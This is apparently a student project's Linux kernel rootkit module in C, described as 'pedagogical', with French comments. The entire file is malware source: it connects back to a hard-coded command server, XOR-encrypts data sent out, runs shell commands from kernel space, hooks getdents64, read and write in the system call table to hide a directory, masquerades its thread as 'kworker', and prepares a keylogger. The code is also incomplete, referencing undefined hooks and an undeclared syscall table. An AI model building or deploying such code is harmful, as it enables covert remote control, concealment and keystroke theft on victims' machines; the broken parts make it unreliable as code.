#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/init.h>
#include <linux/slab.h>
#include <linux/string.h>
#include <linux/kthread.h>
#include <linux/delay.h>
#include <linux/net.h>
#include <linux/in.h>
#include <linux/fs.h>
#include <linux/file.h>
#include <linux/uaccess.h>
#include <linux/ctype.h>
#include <linux/spinlock.h>
#include <linux/list.h>
#include <linux/version.h>
#include <linux/cred.h>
#include <linux/input.h>
#include <linux/namei.h>

MODULE_LICENSE("GPL");
MODULE_AUTHOR("Team_Rodrien");
MODULE_DESCRIPTION("EpiRootkit - A pedagogical rootkit");
MODULE_VERSION("0.2");

/* Configuration améliorée */
static struct rootkit_config {
    unsigned short port;
    char server_ip[16];
    size_t buffer_size;
    char xor_key[32];
    char temp_output_file[64];
    char hidden_dir[64];
    int max_hidden_lines;
} config = {
    .port = 4242,
    .server_ip = "192.168.15.6",
    .buffer_size = 1024,
    .xor_key = "epirootkit",
    .temp_output_file = "/tmp/.rk_out",
    .hidden_dir = "/.rk_hidden",
    .max_hidden_lines = 100
};

/* Structure simplifiée pour le keylogger */
struct keylogger {
    char *buffer;
    size_t size;
    size_t pos;
    spinlock_t lock;
    struct task_struct *thread;
    bool active;
};

/* Variables globales */
static struct socket *g_sock = NULL;
static struct task_struct *g_main_thread = NULL;
static struct keylogger g_keylog;
static bool g_authenticated = false;
static char g_password[32] = "epita";
static LIST_HEAD(g_hidden_lines);
static DEFINE_SPINLOCK(g_hidden_lines_lock);

/* Pointeurs originaux des syscalls */
static asmlinkage long (*orig_getdents64)(unsigned int, struct linux_dirent64 __user *, unsigned int);
static asmlinkage long (*orig_read)(unsigned int, char __user *, size_t);
static asmlinkage long (*orig_write)(unsigned int, const char __user *, size_t);

/* Fonction pour appliquer le chiffrement XOR */
static void xor_cipher(char *data, size_t len) {
    const size_t key_len = strlen(config.xor_key);
    size_t i;

    for (i = 0; i < len; i++) {
        data[i] ^= config.xor_key[i % key_len];
    }
}

/* Fonction pour envoyer des données au serveur */
static int send_data(const char *data) {
    struct msghdr msg = {0};
    struct kvec vec;
    int ret;
    char *encrypted;

    if (!g_sock || !data)
        return -ENOTCONN;

    encrypted = kmalloc(strlen(data) + 1, GFP_KERNEL);
    if (!encrypted)
        return -ENOMEM;

    strcpy(encrypted, data);
    xor_cipher(encrypted, strlen(encrypted));

    vec.iov_base = encrypted;
    vec.iov_len = strlen(encrypted);

    ret = kernel_sendmsg(g_sock, &msg, &vec, 1, vec.iov_len);
    kfree(encrypted);

    return ret;
}

/* Fonction pour exécuter une commande et renvoyer le résultat */
static void exec_command(const char *cmd) {
    char *argv[] = {"/bin/sh", "-c", (char *)cmd, NULL};
    char *envp[] = {"PATH=/usr/bin:/bin", NULL};
    int ret;

    if (!cmd || !*cmd) {
        send_data("ERROR: Empty command");
        return;
    }

    ret = call_usermodehelper(argv[0], argv, envp, UMH_WAIT_EXEC);
    if (ret)
        send_data("ERROR: Command execution failed");
}

/* Hook pour getdents64 */
static asmlinkage long hook_getdents64(unsigned int fd, struct linux_dirent64 __user *dirent, unsigned int count) {
    long ret = orig_getdents64(fd, dirent, count);
    struct linux_dirent64 *dir, *kdirent;
    unsigned long off = 0;

    if (ret <= 0)
        return ret;

    kdirent = kmalloc(ret, GFP_KERNEL);
    if (!kdirent)
        return ret;

    if (copy_from_user(kdirent, dirent, ret)) {
        kfree(kdirent);
        return ret;
    }

    while (off < ret) {
        dir = (void *)kdirent + off;

        if (strstr(dir->d_name, config.hidden_dir)) {
            if (dir == kdirent) {
                ret -= dir->d_reclen;
                memmove(dir, (void *)dir + dir->d_reclen, ret);
                continue;
            }
            dir->d_reclen = 0;
        }

        off += dir->d_reclen;
    }

    if (copy_to_user(dirent, kdirent, ret))
        ret = -EFAULT;

    kfree(kdirent);
    return ret;
}

/* Fonction principale du thread */
static int rootkit_thread(void *arg) {
    int ret;
    struct sockaddr_in addr = {
        .sin_family = AF_INET,
        .sin_port = htons(config.port),
        .sin_addr.s_addr = in_aton(config.server_ip)
    };

    while (!kthread_should_stop()) {
        ret = sock_create(AF_INET, SOCK_STREAM, IPPROTO_TCP, &g_sock);
        if (ret < 0) {
            msleep(5000);
            continue;
        }

        ret = kernel_connect(g_sock, (struct sockaddr *)&addr, sizeof(addr), 0);
        if (ret < 0) {
            sock_release(g_sock);
            g_sock = NULL;
            msleep(5000);
            continue;
        }

        while (!kthread_should_stop()) {
            /* Ici, ajouter la logique de communication */
            msleep(1000);
        }
    }

    return 0;
}

/* Initialisation du module */
static int __init rootkit_init(void) {
    /* Initialisation du keylogger */
    g_keylog.buffer = kzalloc(config.buffer_size, GFP_KERNEL);
    if (!g_keylog.buffer)
        return -ENOMEM;

    g_keylog.size = config.buffer_size;
    g_keylog.pos = 0;
    spin_lock_init(&g_keylog.lock);
    g_keylog.active = false;

    /* Démarrer le thread principal */
    g_main_thread = kthread_run(rootkit_thread, NULL, "kworker/%d", 0);
    if (IS_ERR(g_main_thread)) {
        kfree(g_keylog.buffer);
        return PTR_ERR(g_main_thread);
    }

    /* Hook des syscalls */
    orig_getdents64 = (void *)sys_call_table[__NR_getdents64];
    orig_read = (void *)sys_call_table[__NR_read];
    orig_write = (void *)sys_call_table[__NR_write];

    sys_call_table[__NR_getdents64] = (unsigned long)hook_getdents64;
    sys_call_table[__NR_read] = (unsigned long)hook_read;
    sys_call_table[__NR_write] = (unsigned long)hook_write;

    return 0;
}

/* Nettoyage du module */
static void __exit rootkit_exit(void) {
    /* Arrêt des threads */
    if (g_main_thread)
        kthread_stop(g_main_thread);

    /* Fermeture de la socket */
    if (g_sock)
        sock_release(g_sock);

    /* Restauration des syscalls */
    sys_call_table[__NR_getdents64] = (unsigned long)orig_getdents64;
    sys_call_table[__NR_read] = (unsigned long)orig_read;
    sys_call_table[__NR_write] = (unsigned long)orig_write;

    /* Libération de la mémoire */
    kfree(g_keylog.buffer);
}

module_init(rootkit_init);
module_exit(rootkit_exit);